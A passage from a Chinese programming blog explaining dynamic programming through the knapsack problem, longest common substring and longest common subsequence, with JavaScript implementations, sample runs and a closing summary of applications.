title="注意点"></a>注意点</h3><ol><li><p><strong>各行的排列顺序无关紧要</strong></p><p>也就是说哪个物品先判断都行，你想把音响放在最开始进行分析都可以，不影响结果（但在后面的代码中为了方便我还是会为数据进行排序，从最轻的拿起，可以思考下我为什么那样做，当然也有可能会是我想不到（不足）的地方（怕打脸哈哈哈））</p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221183039104.png" alt="image-20220221183039104"></p></li><li><p><strong>使用动态规划时，要么考虑拿走整件商品，要么考虑不拿，而没法判断该不该拿走商品的一部分（你只能把它当作一个最小的整体，不能继续分割的整体）</strong></p><p>如果想处理像偷大米、黄豆之类可以拆出来倒到背包的问题时，则可以使用贪婪算法</p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221183404146.png" alt="image-20220221183404146"></p></li><li><p>相互依赖的情况</p><p>没办法建模。动态规划功能强大，它能够解决子问题并使用这些答案来解决大问题。但仅当每个子问题都是<strong>离散</strong>的，即不依赖于其他子问题时，动态规划才管用。这意味着使用动态规划算法解决不了子问题会相互产生影响的问题</p></li><li><p>为获得前述背包问题的最优解，可能需要偷两件以上的商品。但根据动态规划算法的设计，最多只需合并两个子背包，即根本不会涉及两个以上的子背包。不过这些子背包可能又包含子背包</p><p>形象来说就是一分为二，再在每个子背包中一分为二（有点类似二叉树）</p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221183745856.png" alt="image-20220221183745856"></p></li><li><p>最优解可能会导致背包没装满</p><p>假设你还可以偷一颗钻石。 这颗钻石非常大，重达3.5磅，价值100万美元，比其他商品都值钱得多。 你绝对应该把它给偷了！但当你这样做时，余下的容量只有0.5磅，别的什么都装不下</p></li></ol><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>思路如下</p><ol><li>因为从上面的算法得出：每次计算当前行都只会用到上一行的数据，所以我并没有像书里一样使用表格去记录这个过程，我使用了两个二维数组prices、goods分别用来存储每格的价值和所含物品，每次每行计算后的最新结果goods[1]会重新赋值给goods[0]，计算前又将goods[0]默认赋值给goods[1]，这样就可以只在价格有改变时改变单元格即可， prices同理</li><li>然后对初始数据initData进行排序，这样可以保证最开始那一行是有数据的，如果是别的比较重的物品，则最开始那几个空格就会为空，就又要去做一些多余的判断或者赋默认值，挺麻烦的，怕代码冗余和出现一些问题</li><li>内层（列）遍历，每次都只用从当前物品重量对应单元格开始算，毕竟前几格你也放不下嘛，默认当前格的上一行值即可，减少代码判断</li><li>核心判断语句不变，跟上面一致</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 深拷贝函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copyDeep</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//算法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dynamicToGetGoods</span>(<span class="params">data, bagWeight</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> initData = <span class="built_in">Array</span>.from(data); <span class="comment">//数据初始化，防止修改到原数据</span></span><br><span class="line">  <span class="keyword">let</span> prices = [[], []]; <span class="comment">//存放价值的数组</span></span><br><span class="line">  <span class="keyword">let</span> goods = [[], []]; <span class="comment">//存放每个最大价值所含物品</span></span><br><span class="line">  initData.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.weight - b.weight); <span class="comment">//数据初始化排序，从小到大</span></span><br><span class="line">  <span class="keyword">let</span> baseWeight = initData[<span class="number">0</span>][<span class="string">'weight'</span>]; <span class="comment">//获得基础容量</span></span><br><span class="line">  <span class="keyword">let</span> pricesLength = <span class="built_in">Math</span>.floor(bagWeight / baseWeight); <span class="comment">//获得背包应分割的数量,向下取整，排除书包额外容量</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化数据,相当于遍历第一件商品</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; pricesLength; i++) &#123;</span><br><span class="line">    prices[<span class="number">0</span>].push(initData[<span class="number">0</span>][<span class="string">'price'</span>]);</span><br><span class="line">    goods[<span class="number">0</span>].push([initData[<span class="number">0</span>][<span class="string">'name'</span>]]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 删除当前商品，避免参与下面的算法执行</span></span><br><span class="line">  <span class="keyword">delete</span> initData[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 算法核心，从第二件商品开始遍历，对每一件商品进行数据填充</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> initData) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = initData[key];</span><br><span class="line">    <span class="keyword">let</span> elementWeightIndex = element[<span class="string">'weight'</span>] / baseWeight - <span class="number">1</span>; <span class="comment">//物品重量对应索引</span></span><br><span class="line"></span><br><span class="line">    prices[<span class="number">1</span>] = copyDeep(prices[<span class="number">0</span>]); <span class="comment">//默认从上一行取值</span></span><br><span class="line">    goods[<span class="number">1</span>] = copyDeep(goods[<span class="number">0</span>]); <span class="comment">//默认从上一行取值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = elementWeightIndex; i &lt; pricesLength; i++) &#123;</span><br><span class="line">      <span class="comment">//第一种情况：当前物品重量同当前背包小格重量相等</span></span><br><span class="line">      <span class="keyword">if</span> (i == elementWeightIndex) &#123;</span><br><span class="line">        <span class="comment">// 如果当前物品价格大于先前价格</span></span><br><span class="line">        <span class="keyword">if</span> (element[<span class="string">'price'</span>] &gt; prices[<span class="number">0</span>][i]) &#123;</span><br><span class="line">          <span class="comment">// 赋值为当前物品及价格</span></span><br><span class="line">          prices[<span class="number">1</span>][i] = element[<span class="string">'price'</span>];</span><br><span class="line">          goods[<span class="number">1</span>][i] = [element[<span class="string">'name'</span>]];</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二种情况，当前物品重量大于当前背包小格重量</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i &gt; elementWeightIndex) &#123;</span><br><span class="line">        <span class="comment">// 如果当前物品价格加上（当前背包质量-当前物品质量）的价格大于先前价格</span></span><br><span class="line">        <span class="keyword">if</span> (element[<span class="string">'price'</span>] + prices[<span class="number">0</span>][i - elementWeightIndex - <span class="number">1</span>] &gt; prices[<span class="number">0</span>][i]) &#123;</span><br><span class="line">          <span class="comment">// 赋值为当前物品和（当前背包质量-当前物品质量）的物品总和及价格总和</span></span><br><span class="line">          prices[<span class="number">1</span>][i] = element[<span class="string">'price'</span>] + prices[<span class="number">0</span>][i - elementWeightIndex - <span class="number">1</span>];</span><br><span class="line">          goods[<span class="number">1</span>][i] = [element[<span class="string">'name'</span>], ...goods[<span class="number">0</span>][i - elementWeightIndex - <span class="number">1</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    prices[<span class="number">0</span>] = copyDeep(prices[<span class="number">1</span>]);</span><br><span class="line">    goods[<span class="number">0</span>] = copyDeep(goods[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    goods: goods[<span class="number">1</span>][pricesLength - <span class="number">1</span>],</span><br><span class="line">    price: prices[<span class="number">1</span>][pricesLength - <span class="number">1</span>],</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运行下"><a href="#运行下" class="headerlink" title="运行下"></a>运行下</h4><p>模拟数据有点多，不要介意，确保可靠嘛</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> data = [</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'吉他'</span>, <span class="attr">price</span>: <span class="number">1500</span>, <span class="attr">weight</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'音响'</span>, <span class="attr">price</span>: <span class="number">3000</span>, <span class="attr">weight</span>: <span class="number">4</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'笔记本电脑'</span>, <span class="attr">price</span>: <span class="number">2000</span>, <span class="attr">weight</span>: <span class="number">3</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'iphone'</span>, <span class="attr">price</span>: <span class="number">2000</span>, <span class="attr">weight</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'ipad'</span>, <span class="attr">price</span>: <span class="number">2000</span>, <span class="attr">weight</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'自行车'</span>, <span class="attr">price</span>: <span class="number">50000</span>, <span class="attr">weight</span>: <span class="number">15</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'钻石'</span>, <span class="attr">price</span>: <span class="number">50000</span>, <span class="attr">weight</span>: <span class="number">3</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'花'</span>, <span class="attr">price</span>: <span class="number">50</span>, <span class="attr">weight</span>: <span class="number">0.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'巧克力'</span>, <span class="attr">price</span>: <span class="number">500</span>, <span class="attr">weight</span>: <span class="number">0.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'耳机'</span>, <span class="attr">price</span>: <span class="number">1500</span>, <span class="attr">weight</span>: <span class="number">0.5</span> &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> res = dynamicToGetGoods(data, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">console</span>.log(res);</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; goods: [ '音响', '钻石', 'iphone', '吉他', '耳机', '巧克力' ], price: 58500 &#125;</span><br></pre></td></tr></table></figure><h2 id="算法思路"><a href="#算法思路" class="headerlink" title="算法思路"></a>算法思路</h2><ol><li>动态规划可帮助你在给定约束条件下找到最优解。在背包问题中，你必须在背包容量给定的情况下，偷到价值最高的商品。</li><li>在问题可分解为彼此独立且离散的子问题时，就可使用动态规划来解决。 </li><li>每种动态规划解决方案都涉及网格</li><li>单元格中的值通常就是你要优化的值。在前面的背包问题中，单元格的值为商品的价值。</li><li>每个单元格都是一个子问题，因此你应考虑如何将问题分成子问题，这有助于你找出网格的坐标轴</li></ol><p>每次用的时候问问自己</p><blockquote><ol><li>单元格中的值是什么？</li><li>如何将这个问题划分为子问题？ </li><li>网格的坐标轴是什么？</li></ol></blockquote><h2 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h2><ol><li>建立表格</li><li>确定每一个格的值代表什么 </li><li>如何将大问题划分为具有相同解法的子问题</li><li>确定网格坐标轴</li></ol><h2 id="最长公共子串"><a href="#最长公共子串" class="headerlink" title="最长公共子串"></a>最长公共子串</h2><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221185431847.png" alt="image-20220221185431847"></p><p>尝试一下，在纸上绘制网格，将每个单词分解（子问题）</p><p>答案如下（思考下，这是如何得出的）</p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221185929563.png" alt="image-20220221185929563"></p><p>解决这个问题核心的伪代码类似于下面这样</p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221185552675.png" alt="image-20220221185552675"></p><h3 id="注意！！！"><a href="#注意！！！" class="headerlink" title="注意！！！"></a>注意！！！</h3><ol><li><p>对于最长公共子串问题，答案为网格中最大的数字——它可能并不位于最后的单元格中</p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221190054121.png" alt="image-20220221190054121"></p></li></ol><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>你可以先尝试着根据上面的思路自己写一下</p><p>在写的过程中你是否会发现一个问题，在代码的实现上，我们会发现上面的公式会有些问题，毕竟我们是用二维数组去记录这个过程，所以某些情况下会出现<code>data[index1 - 1][index2 - 1]</code>报错的情况，什么情况下呢</p><p>如下图，这些情况下的值在你按部就班时运行会报错的，因为它缺少斜对角的值，毕竟没有<code>data[-1][-1]</code>这样的值出现</p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220222085726502.png" alt="image-20220222085726502"></p><p>怎么解决，有两种方法，第一种是每次到该计算都做一下判断，判断是否有值，我嫌太麻烦了，且影响从代码上去理解这个算法的思路，所以使用第二种，给你一个二维数组，你就会理解了，然后我就懒得解释了哈哈哈</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [ <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> ],</span><br><span class="line">  [ <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> ],</span><br><span class="line">  [ <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span> ],</span><br><span class="line">  [ <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span> ],</span><br><span class="line">  [ <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span> ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在里面，我会用一个函数<code>fillDataByWordLength</code>去填充第一行的0，以及在内层循环（列）中每次一开始填充一个0</p><p>还有一点，我使用了<code>max</code>和<code>maxWord</code>在每次判断时去分别存储<strong>最长公共子串长度</strong>和<strong>最长公共子串</strong>，免得后面再在二维数组去找一个最大值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[index1][index2] &gt; max &amp;&amp; ((max = data[index1][index2]), (maxWord1Position = index1 - <span class="number">1</span>)); <span class="comment">//最长公共子串数赋值</span></span><br></pre></td></tr></table></figure><p><code>getMaxWord</code>函数主要用作获得最长的公共子串，比如，fish和fosh最长的公共子串就为sh</p><p>然后再看看下面的代码，应该没啥问题了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据word长度填充数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillDataByWordLength</span>(<span class="params">word, data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arr = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= word.length; i++) &#123;</span><br><span class="line">    arr.push(data);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得最长的公共子串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMaxWord</span>(<span class="params">word, maxWordPosition, max</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = maxWordPosition - max + <span class="number">1</span>; i &lt;= maxWordPosition; i++) &#123;</span><br><span class="line">    res += word[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dynamicToGetCommonWords</span>(<span class="params">word1, word2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data = []; <span class="comment">//存储动态规划网格</span></span><br><span class="line">  <span class="keyword">let</span> max = <span class="number">0</span>; <span class="comment">//存储最长公共子串数</span></span><br><span class="line">  <span class="keyword">let</span> maxWord; <span class="comment">//存储最长公共子串</span></span><br><span class="line">  <span class="keyword">let</span> maxWord1Position; <span class="comment">//存储最长公共子串截至位置</span></span><br><span class="line">  data[<span class="number">0</span>] = fillDataByWordLength(word2, <span class="number">0</span>); <span class="comment">//数组填充</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 算法核心</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index1 = <span class="number">1</span>; index1 &lt; word1.length + <span class="number">1</span>; index1++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element1 = word1[index1 - <span class="number">1</span>]; <span class="comment">//获取当前字母</span></span><br><span class="line">    data[index1] = []; <span class="comment">//初始化数组</span></span><br><span class="line">    data[index1].push(<span class="number">0</span>); <span class="comment">//默认第一位为0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index2 = <span class="number">1</span>; index2 &lt; word2.length + <span class="number">1</span>; index2++) &#123;</span><br><span class="line">      <span class="keyword">const</span> element2 = word2[index2 - <span class="number">1</span>]; <span class="comment">//获取当前对比字母</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (element1 == element2) &#123;</span><br><span class="line">        <span class="comment">// 若相等，则当前单元格值等于左对角线方格值加上1</span></span><br><span class="line">        data[index1][index2] = data[index1 - <span class="number">1</span>][index2 - <span class="number">1</span>] + <span class="number">1</span>; <span class="comment">//当前单元格赋值</span></span><br><span class="line">        data[index1][index2] &gt; max &amp;&amp; ((max = data[index1][index2]), (maxWord1Position = index1 - <span class="number">1</span>)); <span class="comment">//最长公共子串数赋值</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 不相等则赋值为0</span></span><br><span class="line">        data[index1][index2] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  maxWord = getMaxWord(word1, maxWord1Position, max);</span><br><span class="line">  <span class="keyword">return</span> &#123; max, maxWord &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运行下-1"><a href="#运行下-1" class="headerlink" title="运行下"></a>运行下</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = dynamicToGetCommonWords(<span class="string">'fish'</span>, <span class="string">'fosh'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(res);</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221190426458.png" alt="image-20220221190426458"></p><h2 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221190516948.png" alt="image-20220221190516948"></p><p>这里比较的是最长公共子串，但其实应比较最长公共子序列：两个单词中都有的序列包含的 字母数。如何计算最长公共子序列呢</p><p>计算过程如下：图很重要！！！！！！（懒得打字了）</p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221190615957.png" alt="image-20220221190615957"></p><p>核心伪代码</p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221190713163.png" alt="image-20220221190713163"></p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><p>思路是和上面例子很相近的，只是判断语句不同了而已，直接看代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据word长度填充数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillDataByWordLength</span>(<span class="params">word, data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arr = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= word.length; i++) &#123;</span><br><span class="line">    arr.push(data);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dynamicToGetCommonWords</span>(<span class="params">word1, word2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data = []; <span class="comment">//存储动态规划网格</span></span><br><span class="line">  data[<span class="number">0</span>] = fillDataByWordLength(word2, <span class="number">0</span>); <span class="comment">//数组填充</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 算法核心</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index1 = <span class="number">1</span>; index1 &lt; word1.length + <span class="number">1</span>; index1++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element1 = word1[index1 - <span class="number">1</span>]; <span class="comment">//获取当前字母</span></span><br><span class="line">    data[index1] = []; <span class="comment">//初始化数组</span></span><br><span class="line">    data[index1].push(<span class="number">0</span>); <span class="comment">//默认第一位为0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index2 = <span class="number">1</span>; index2 &lt; word2.length + <span class="number">1</span>; index2++) &#123;</span><br><span class="line">      <span class="keyword">const</span> element2 = word2[index2 - <span class="number">1</span>]; <span class="comment">//获取当前对比字母</span></span><br><span class="line">      <span class="keyword">if</span> (element1 == element2) &#123;</span><br><span class="line">        <span class="comment">// 若相等，则当前单元格值等于左对角线方格值加上1</span></span><br><span class="line">        data[index1][index2] = data[index1 - <span class="number">1</span>][index2 - <span class="number">1</span>] + <span class="number">1</span>; <span class="comment">//当前单元格赋值</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 若不相等，则从左边或上边的邻居方格中取一个最大值</span></span><br><span class="line">        data[index1][index2] = <span class="built_in">Math</span>.max(data[index1][index2 - <span class="number">1</span>], data[index1 - <span class="number">1</span>][index2]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">res</span>: data[word1.length][word2.length], <span class="attr">calculationMatrix</span>: data &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运行下-2"><a href="#运行下-2" class="headerlink" title="运行下"></a>运行下</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = dynamicToGetCommonWords(<span class="string">'fish'</span>, <span class="string">'fosh'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(res);</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221191104618.png" alt="image-20220221191104618"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><h3 id="动态规划的实际应用"><a href="#动态规划的实际应用" class="headerlink" title="动态规划的实际应用"></a>动态规划的实际应用</h3><ul><li>生物学家根据最长公共序列来确定DNA链的相似性，进而判断度两种动物或疾病有多相似。最长公共序列还被用来寻找多发性硬化症治疗方案。 </li><li>你使用过诸如git diff等命令吗？它们指出两个文件的差异，也是使用动态规划实现的。</li><li>前面讨论了字符串的相似程度。编辑距离（levenshtein distance）指出了两个字符串的相似程度，也是使用动态规划计算得到的。编辑距离算法的用途很多，从拼写检查到判断用户上传的资料是否是盗版，都在其中。</li><li>你使用过诸如Microsoft Word等具有断字功能的应用程序吗？它们如何确定在什么地方断字以确保行长一致呢？使用动态规划！</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>需要在给定约束条件下优化某种指标时，动态规划很有用。</li><li>问题可分解为离散子问题时，可使用动态规划来解决。</li><li>每种动态规划解决方案都涉及网格。</li><li>单元格中的值通常就是你要优化的值。</li><li>每个单元格都是一个子问题，因此你需要考虑如何将问题分解为子问题。</li><li>没有放之四海皆准的计算动态规划解决方案的公式</li></ol>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>贪婪算法</title>
      <link href="/2022/02/10/%E8%B4%AA%E5%A9%AA%E7%AE%97%E6%B3%95/"/>
      <url>/2022/02/10/%E8%B4%AA%E5%A9%AA%E7%AE%97%E6%B3%95/</url>
      
